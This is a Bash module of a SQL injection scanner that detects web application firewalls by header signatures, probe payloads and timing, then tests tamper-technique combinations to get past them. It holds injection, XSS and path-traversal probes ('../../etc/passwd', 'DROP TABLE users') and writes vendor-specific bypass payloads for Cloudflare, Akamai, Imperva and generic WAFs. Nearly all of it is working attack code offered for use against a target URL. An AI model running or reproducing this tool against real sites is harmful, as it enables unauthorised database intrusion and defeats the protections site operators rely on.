#!/bin/bash
# SQLInjectionScanner WAF Module - Advanced WAF detection and bypass
# This file contains specialized functions for detecting and bypassing WAF protections

# Source the core module
# shellcheck source=sqli_core.sh
. "./sqli_core.sh"

# ---------------------------- WAF Functions ----------------------------

# Enhanced WAF signatures database
declare -A WAF_SIGNATURES=(
  ["cloudflare"]="cloudflare|cloudflare-nginx|cf-ray|__cfduid"
  ["akamai"]="akamai|akamaitech|akamaiedge"
  ["imperva"]="incapsula|imperva|incap_ses|visid_incap"
  ["awswaf"]="aws|waf|amazon|awselb"
  ["f5bigip"]="f5|big-?ip|ts=[0-9a-f]{8}|BigIP|BIGipServer"
  ["sucuri"]="sucuri|cloudproxy"
  ["barracuda"]="barracuda|barra"
  ["citrix"]="citrix|netscaler"
  ["paloalto"]="paloalto|panorama"
  ["fortinet"]="fortinet|fortigate|fortibalancer"
  ["wordfence"]="wordfence|wfvt_"
  ["modsecurity"]="mod_security|modsecurity|OWASP[_+ ]CRS"
  ["comodo"]="comodo|ccm[-_]?"
  ["generic"]="firewall|waf|security|block|denied|reject"
)

# WAF bypass techniques optimized for different WAFs
declare -A WAF_BYPASS_TECHNIQUES=(
  ["cloudflare"]="space2comment,charencode,randomcase,charunicodeescape"
  ["akamai"]="space2randomblank,charunicodeencode,between,randomcase"
  ["imperva"]="modsecurityzeroversioned,space2comment,space2randomblank,randomcase"
  ["awswaf"]="space2dash,charunicodeencode,equaltolike,greatest,between"
  ["f5bigip"]="space2morehash,randomcase,charencode,apostrophemask"
  ["sucuri"]="space2randomblank,charunicodeencode,randomcomments,unionalltounion"
  ["barracuda"]="space2comment,charencode,apostrophemask,hex2char"
  ["citrix"]="space2plus,charunicodeencode,equaltolike,randomcase"
  ["paloalto"]="space2randomblank,between,randomcase,charencode"
  ["fortinet"]="apostrophemask,modsecurityversioned,charunicodeencode,space2mssqlhash"
  ["wordfence"]="space2comment,randomcase,charencode,apostrophemask"
  ["modsecurity"]="modsecurityversioned,space2comment,space2hash,apostrophemask"
  ["comodo"]="space2randomblank,apostrophemask,charencode,hexentities"
  ["generic"]="space2comment,between,percentage,randomcase,charunicodeencode,apostrophemask"
)

# Function to detect WAF with enhanced precision
detect_waf_advanced() {
  local target_url="$1"
  local max_retries=3
  local retry_count=0
  local waf_detected=false
  local detected_waf="none"
  
  log "INFO" "Performing advanced WAF detection on $target_url..."
  
  # WAF detection payloads (highly effective triggers)
  local waf_detection_payloads=(
    "1' OR '1'='1"
    "' UNION SELECT 1,2,3,4,5-- -"
    "1'; DROP TABLE users; --"
    "' OR 1=1 #"
    "<script>alert(1)</script>"
    "../../etc/passwd"
    "AND 1=2 UNION SELECT 1,2,3,4,@@version,6--"
    "1' AND SLEEP(5) AND '1'='1"
  )
  
  # Headers that might reveal WAF information
  local waf_headers=(
    "server"
    "x-powered-by"
    "set-cookie"
    "via"
    "x-forwarded-for"
    "x-real-ip"
    "x-firewall-protection"
    "x-waf"
    "x-security"
  )
  
  # First, check for WAF headers in normal response
  local clean_response=$(curl -s -L -I "$target_url" -A "$USER_AGENT" -m 10)
  
  for header in "${waf_headers[@]}"; do
    local header_value=$(echo "$clean_response" | grep -i "^$header:" | cut -d: -f2- | tr -d '\r')
    if [[ -n "$header_value" ]]; then
      log "VERBOSE" "Header $header: $header_value"
      
      # Check header against WAF signatures
      for waf_name in "${!WAF_SIGNATURES[@]}"; do
        if echo "$header_value" | grep -Eiq "${WAF_SIGNATURES[$waf_name]}"; then
          detected_waf="$waf_name"
          waf_detected=true
          log "SUCCESS" "WAF detected via headers: $detected_waf"
          break 2
        fi
      done
    fi
  done
  
  # If no WAF detected via headers, try with payloads
  if ! $waf_detected; then
    log "VERBOSE" "No WAF detected via headers, trying with payloads..."
    
    for payload in "${waf_detection_payloads[@]}"; do
      # URL-encode payload
      encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
      
      # Test URL with payload
      test_url="${target_url}?id=${encoded_payload}"
      
      # Get response
      response=$(curl -s -L -o /dev/null -D - -w "STATUS:%{http_code}" -A "$USER_AGENT" -m 10 "$test_url")
      http_code=$(echo "$response" | grep -o "STATUS:[0-9]*" | cut -d: -f2)
      
      # Check response for WAF patterns
      log "VERBOSE" "Testing payload: $payload (HTTP: $http_code)"
      
      # Check for typical WAF response codes
      if [[ "$http_code" == "403" || "$http_code" == "406" || "$http_code" == "429" || "$http_code" == "301" ]]; then
        # Extract response body
        body_response=$(curl -s -L "$test_url" -A "$USER_AGENT" -m 10)
        
        # Check for WAF signatures in response
        for waf_name in "${!WAF_SIGNATURES[@]}"; do
          if echo "$response $body_response" | grep -Eiq "${WAF_SIGNATURES[$waf_name]}"; then
            detected_waf="$waf_name"
            waf_detected=true
            log "SUCCESS" "WAF detected via payload test: $detected_waf"
            break 2
          fi
        done
        
        # If we got a blocking response but couldn't identify the WAF type
        if ! $waf_detected; then
          detected_waf="generic"
          waf_detected=true
          log "SUCCESS" "Generic WAF/firewall detected (specific type unknown)"
          break
        fi
      fi
    done
  fi
  
  # If no WAF detected, try behavior-based detection
  if ! $waf_detected; then
    log "VERBOSE" "No WAF detected via direct tests, trying behavior analysis..."
    
    # Test delay-based WAF detection
    # Measure normal response time
    start_time=$(date +%s.%N)
    curl -s -o /dev/null "$target_url" -A "$USER_AGENT" -m 10
    end_time=$(date +%s.%N)
    normal_time=$(echo "$end_time - $start_time" | bc)
    
    # Test with suspicious payload
    payload="1' OR 1=1 -- -"
    encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
    test_url="${target_url}?id=${encoded_payload}"
    
    start_time=$(date +%s.%N)
    response=$(curl -s -L -o /dev/null -w "%{http_code}" -A "$USER_AGENT" -m 10 "$test_url")
    end_time=$(date +%s.%N)
    attack_time=$(echo "$end_time - $start_time" | bc)
    
    # Compare times - significantly longer times may indicate WAF processing
    time_diff=$(echo "$attack_time - $normal_time" | bc)
    if (( $(echo "$time_diff > 1.0" | bc -l) )); then
      detected_waf="behavior_based"
      waf_detected=true
      log "SUCCESS" "WAF detected via behavioral analysis (response time increase: ${time_diff}s)"
    fi
  fi
  
  # Store detection results
  if $waf_detected; then
    log "INFO" "WAF detection complete. WAF type: $detected_waf"
    WAF_TYPE="$detected_waf"
    echo "$detected_waf"
  else
    log "INFO" "No WAF detected on target."
    WAF_TYPE="none"
    echo "none"
  fi
}

# Function to test WAF bypass effectiveness
test_waf_bypass() {
  local target_url="$1"
  local waf_type="$2"
  local best_techniques=""
  local best_score=0
  
  log "INFO" "Testing WAF bypass techniques for $waf_type WAF..."
  
  # If waf_type is in our known WAFs, use its specific techniques
  if [[ -n "${WAF_BYPASS_TECHNIQUES[$waf_type]}" ]]; then
    recommended_techniques="${WAF_BYPASS_TECHNIQUES[$waf_type]}"
  else
    # Default techniques for unknown WAFs
    recommended_techniques="${WAF_BYPASS_TECHNIQUES[generic]}"
  fi
  
  # Split the recommended techniques into an array and test each
  # Plus add some standard test combinations
  test_combos=()
  IFS=',' read -ra base_techniques <<< "$recommended_techniques"
  
  # Generate test combinations (all recommended techniques, plus subsets)
  test_combos+=("$recommended_techniques")
  test_combos+=("${base_techniques[0]},${base_techniques[1]}")
  test_combos+=("${base_techniques[0]},${base_techniques[2]}")
  test_combos+=("randomcase,space2comment")
  test_combos+=("between,randomcase")
  test_combos+=("charunicodeencode,space2randomblank")
  
  # A payload that would typically be blocked
  test_payload="' OR 1=1 -- -"
  
  # Test each combination
  for combo in "${test_combos[@]}"; do
    log "VERBOSE" "Testing tamper combination: $combo"
    
    # Apply the tamper techniques to our test payload
    tampered_payload=$(apply_tamper "$test_payload" "$combo")
    encoded_payload=$(encode_payload "$tampered_payload")
    
    # Build the test URL and try it
    test_url="${target_url}?id=${encoded_payload}"
    
    # Execute request
    response=$(curl -s -L -o /dev/null -w "%{http_code}" -A "$USER_AGENT" -m 10 "$test_url")
    
    # Check if it bypasses WAF (200 response is good, other codes not so much)
    if [[ "$response" == "200" ]]; then
      log "SUCCESS" "WAF bypass successful with techniques: $combo"
      best_techniques="$combo"
      break
    elif [[ "$response" == "30"* ]]; then
      # Redirect might be a partial success
      log "VERBOSE" "Redirect response with techniques: $combo"
      best_techniques="$combo,apostrophemask,hexentities"  # Add more encoding
    fi
  done
  
  # If no ideal combination found, go with the recommended default
  if [[ -z "$best_techniques" ]]; then
    best_techniques="$recommended_techniques"
    log "INFO" "No perfect bypass found, using recommended techniques: $best_techniques"
  fi
  
  echo "$best_techniques"
}

# Function to generate dynamic bypass payloads based on WAF type
generate_waf_bypass_payloads() {
  local waf_type="$1"
  local output_file="${OUTPUT_DIR}/waf_bypass_payloads.txt"
  
  log "INFO" "Generating specialized WAF bypass payloads for $waf_type..."
  
  # Start with generic SQL injection payloads
  {
    echo "# WAF Bypass Payloads Generated for $waf_type"
    echo "# Generated on $(date)"
    echo ""
    
    case "$waf_type" in
      "cloudflare")
        # Cloudflare bypasses often involve unicode and comments
        echo "/*!50000select*/ 1,2,3"
        echo "/*!50000%27 OR 1=1%23*/"
        echo "SELECT%09%0D%0A1,2,3"
        echo "%55NION/**/%53ELECT 1,2,3"
        echo "/*!50000UniON*//*!50000seLEcT*/ 1,2,3"
        echo "unio%u006E %u0053elect 1,2,3"
        ;;
      "akamai")
        # Akamai bypasses focus on obfuscation
        echo "%2f**%2f1'+or+'1'%3d'1"
        echo "1'+UnIoN%0a/**/SeLeCt%0a1,2,3--+-"
        echo "1'/**/or/**/'1'='1"
        echo "1'%0bOR%0b'1'%0d=%0d'1"
        ;;
      "imperva")
        # Imperva needs special handling
        echo "1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT(0x7e,0x27,BENCHMARK(3000000,MD5(1)),0x27,0x7e,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)-- -"
        echo "1'/**/AND/**/1=1/**/#"
        echo "1'%23%0Aand%23%0A1%23%0A=%23%0A1"
        ;;
      *)
        # Generic bypasses for other WAFs
        echo "1'/**/OR/**/'1'='1"
        echo "1'+/*!50000UnIoN*/+/*!50000SeLeCt*/+1,2,3--+"
        echo "UniOn/**/%53eLeCt/**/1,2,3"
        echo "1'/**/oR/**/1/**/=/**/1/**/#"
        ;;
    esac
  } > "$output_file"
  
  log "INFO" "WAF bypass payloads saved to $output_file"
  return 0
}

# Function to get the most effective WAF bypass strategy
get_waf_bypass_strategy() {
  local target_url="$1"
  
  # Detect WAF type
  local waf_type=$(detect_waf_advanced "$target_url")
  
  # If WAF detected, test bypasses
  if [[ "$waf_type" != "none" ]]; then
    # Test what techniques work best
    local tamper_techniques=$(test_waf_bypass "$target_url" "$waf_type")
    
    # Generate specialized payloads
    generate_waf_bypass_payloads "$waf_type"
    
    # Return the bypass strategy
    echo "$waf_type:$tamper_techniques"
  else
    # No WAF detected
    echo "none:none"
  fi
}

# Export WAF functions
export -f detect_waf_advanced
export -f test_waf_bypass
export -f generate_waf_bypass_payloads
export -f get_waf_bypass_strategy
export WAF_SIGNATURES
export WAF_BYPASS_TECHNIQUES 